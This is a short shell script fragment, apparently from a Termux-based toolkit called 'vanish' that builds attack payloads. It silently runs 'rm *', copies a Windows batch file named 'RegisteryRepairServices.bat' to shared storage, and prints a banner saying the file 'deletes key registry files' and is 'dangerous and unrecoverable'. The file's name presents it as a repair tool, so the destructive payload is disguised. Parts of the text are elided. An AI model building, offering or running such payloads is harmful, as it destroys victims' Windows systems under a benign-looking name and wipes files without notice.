...
rm * >/dev/null 2>&1
cd $HOME
cp $HOME/vanish/core/src/windows/RegisteryRepairServices.bat /sdcard/vanrc >/dev/null 2>&1
clear
echo -e "\e[91m
   ┬─┐┌─┐┌─┐┬┌─┐┌┬┐┌─┐┬─┐┬ ┬  ┌┬┐┌─┐┬  ┌─┐┌┬┐┌─┐
   ├┬┘├┤ │ ┬│└─┐ │ ├┤ ├┬┘└┬┘   ││├┤ │  ├┤  │ ├┤ 
...
"
echo
echo -e "  \e[91m[\e[0mdeletes key registry files, then loops message
         This is dangerous and unrecoverable.\e[91m]\e[0m"
cd $HOME/vanish/core/src/windows
link=$(cat registerydelete)
